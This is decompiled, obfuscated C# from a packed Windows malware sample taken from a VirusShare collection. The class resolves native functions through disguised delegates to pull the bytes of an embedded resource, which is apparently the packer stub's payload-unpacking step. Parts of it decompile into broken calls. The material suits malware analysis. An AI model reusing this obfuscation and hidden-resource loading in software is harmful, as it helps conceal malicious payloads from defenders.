// Decompiled with JetBrains decompiler
// Type: 0
// Assembly: syncui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8C369EE2-0F8E-40F6-BD9C-ED440A7013AE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Packed.Win32.CPEX-based.ht-72f8bd90449e3c4875b681f4afb213e7bd866e6a0e1c08546770c7c21f92eed5.exe

using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

[SuppressIldasm]
internal sealed class \u0030 : \u007C
{
  private \u0030.\u003F \u0025;
  private \u0030.\u00AC \u005E;
  private \u0030.\u003A \u0026;
  private \u0030.\u003B \u002A;

  public \u0030()
  {
    if (false)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector();
    \u0026.\u0040 = (\u007C) new \u003D();
    this.\u0025 = (\u0030.\u003F) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u0030.\u003F));
    this.\u005E = (\u0030.\u00AC) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u0030.\u00AC));
    this.\u0026 = (\u0030.\u003A) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u0030.\u003A));
    this.\u002A = (\u0030.\u003B) \u0026.\u0040.\u0040((object) .(), (object) .(), (object) typeof (\u0030.\u003B));
  }

  public override object \u0040(params object[] _param1)
  {
    if (false)
      ;
    byte[] destination = new byte[0];
    try
    {
      IntPtr num = this.\u0025(IntPtr.Zero, (IntPtr) (int) _param1[0], (IntPtr) 4);
      IntPtr source = this.\u0026(this.\u005E(IntPtr.Zero, num));
      int length = this.\u002A(IntPtr.Zero, num);
      destination = new byte[length];
      Marshal.Copy(source, destination, 0, length);
    }
    catch
    {
      return (object) destination;
    }
    return (object) destination;
  }

  [SuppressIldasm]
  private delegate IntPtr \u00AC([In] IntPtr obj0, [In] IntPtr obj1);

  [SuppressIldasm]
  private delegate IntPtr \u003F([In] IntPtr obj0, [In] IntPtr obj1, [In] IntPtr obj2);

  [SuppressIldasm]
  private delegate int \u003B([In] IntPtr obj0, [In] IntPtr obj1);

  [SuppressIldasm]
  private delegate IntPtr \u003A([In] IntPtr obj0);
}
